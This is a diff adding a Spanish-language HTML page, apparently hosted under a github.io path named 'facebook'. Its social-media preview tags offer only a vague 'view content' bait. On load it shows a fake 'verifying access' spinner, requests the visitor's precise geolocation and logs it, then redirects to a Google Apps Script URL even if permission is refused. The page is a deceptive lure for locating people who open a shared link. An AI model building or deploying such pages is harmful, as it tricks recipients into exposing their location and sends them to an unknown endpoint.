@@ -1,0 +1,371 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- ========================================= -->
+    <!-- INFORMACIÓN DE LA PÁGINA -->
+    <!-- ========================================= -->
+
+    <title>Ver contenido</title>
+
+    <meta name="description"
+          content="Accede para visualizar el contenido.">
+
+
+    <!-- ========================================= -->
+    <!-- VISTA PREVIA PARA WHATSAPP -->
+    <!-- ========================================= -->
+
+    <meta property="og:title"
+          content="Ver contenido">
+
+    <meta property="og:description"
+          content="Accede para visualizar el contenido.">
+
+    <meta property="og:type"
+          content="website">
+
+    <meta property="og:url"
+          content="https://dylan78459.github.io/facebook/">
+
+    <!-- IMAGEN DE VISTA PREVIA -->
+
+    <meta property="og:image"
+          content="https://dylan78459.github.io/facebook/images%20%281%29.png">
+
+    <meta property="og:image:type"
+          content="image/png">
+
+    <meta property="og:image:width"
+          content="1200">
+
+    <meta property="og:image:height"
+          content="630">
+
+
+    <!-- ========================================= -->
+    <!-- VISTA PREVIA PARA X / TWITTER -->
+    <!-- ========================================= -->
+
+    <meta name="twitter:card"
+          content="summary_large_image">
+
+    <meta name="twitter:title"
+          content="Ver contenido">
+
+    <meta name="twitter:description"
+          content="Accede para visualizar el contenido.">
+
+    <meta name="twitter:image"
+          content="https://dylan78459.github.io/facebook/images%20%281%29.png">
+
+
+    <!-- ========================================= -->
+    <!-- ESTILOS -->
+    <!-- ========================================= -->
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+
+            margin: 0;
+            padding: 0;
+
+            width: 100%;
+            height: 100%;
+
+            font-family: Arial, Helvetica, sans-serif;
+
+            background: #ffffff;
+
+        }
+
+
+        .contenedor {
+
+            width: 100%;
+            height: 100vh;
+
+            display: flex;
+
+            justify-content: center;
+            align-items: center;
+
+            text-align: center;
+
+        }
+
+
+        .mensaje {
+
+            width: 90%;
+            max-width: 420px;
+
+            padding: 30px;
+
+        }
+
+
+        .spinner {
+
+            width: 45px;
+            height: 45px;
+
+            margin: 0 auto 25px;
+
+            border: 4px solid #e5e5e5;
+
+            border-top: 4px solid #333333;
+
+            border-radius: 50%;
+
+            animation: girar 1s linear infinite;
+
+        }
+
+
+        @keyframes girar {
+
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+
+        }
+
+
+        h2 {
+
+            margin: 0 0 12px;
+
+            font-size: 21px;
+
+            font-weight: 600;
+
+            color: #222222;
+
+        }
+
+
+        p {
+
+            margin: 0;
+
+            font-size: 14px;
+
+            line-height: 1.5;
+
+            color: #666666;
+
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+    <!-- ========================================= -->
+    <!-- CONTENIDO -->
+    <!-- ========================================= -->
+
+    <div class="contenedor">
+
+        <div class="mensaje">
+
+            <div class="spinner"></div>
+
+            <h2>
+                Verificando acceso...
+            </h2>
+
+            <p>
+                Esta página utiliza tu ubicación para continuar.
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- ========================================= -->
+    <!-- JAVASCRIPT -->
+    <!-- ========================================= -->
+
+    <script>
+
+
+        /*
+         * URL DE GOOGLE APPS SCRIPT
+         */
+
+        const destino =
+            "https://script.google.com/macros/s/AKfycbxxO36b1PBzUzRaxbBkmLX5xyq16IBbZAYHQ3FEbbSpDsm6D6IrdAS6QvU_t6sY0_BFKg/exec";
+
+
+        /*
+         * FUNCIÓN PARA SOLICITAR UBICACIÓN
+         */
+
+        function solicitarUbicacion() {
+
+
+            /*
+             * Comprobar si el navegador
+             * permite geolocalización
+             */
+
+            if (!navigator.geolocation) {
+
+                console.log(
+                    "Este navegador no permite geolocalización."
+                );
+
+                window.location.href = destino;
+
+                return;
+
+            }
+
+
+            /*
+             * Solicitar ubicación
+             */
+
+            navigator.geolocation.getCurrentPosition(
+
+
+                /*
+                 * UBICACIÓN OBTENIDA
+                 */
+
+                function(position) {
+
+
+                    const latitud =
+                        position.coords.latitude;
+
+
+                    const longitud =
+                        position.coords.longitude;
+
+
+                    const precision =
+                        position.coords.accuracy;
+
+
+                    console.log(
+                        "Latitud:",
+                        latitud
+                    );
+
+
+                    console.log(
+                        "Longitud:",
+                        longitud
+                    );
+
+
+                    console.log(
+                        "Precisión:",
+                        precision
+                    );
+
+
+                    /*
+                     * Redirigir a Google Apps Script
+                     */
+
+                    window.location.href =
+                        destino;
+
+                },
+
+
+                /*
+                 * ERROR O PERMISO DENEGADO
+                 */
+
+                function(error) {
+
+
+                    console.log(
+                        "No se pudo obtener la ubicación."
+                    );
+
+
+                    console.log(
+                        "Código:",
+                        error.code
+                    );
+
+
+                    console.log(
+                        "Mensaje:",
+                        error.message
+                    );
+
+
+                    /*
+                     * Si el usuario rechaza
+                     * el permiso, continúa
+                     * hacia Apps Script.
+                     */
+
+                    window.location.href =
+                        destino;
+
+                },
+
+
+                /*
+                 * CONFIGURACIÓN
+                 */
+
+                {
+
+                    enableHighAccuracy: true,
+
+                    timeout: 10000,
+
+                    maximumAge: 0
+
+                }
+
+            );
+
+        }
+
+
+        /*
+         * EJECUTAR AL CARGAR LA PÁGINA
+         */
+
+        window.addEventListener(
+            "load",
+            solicitarUbicacion
+        );
+
+
+    </script>
+
+
+</body>
+
+</html>
+```
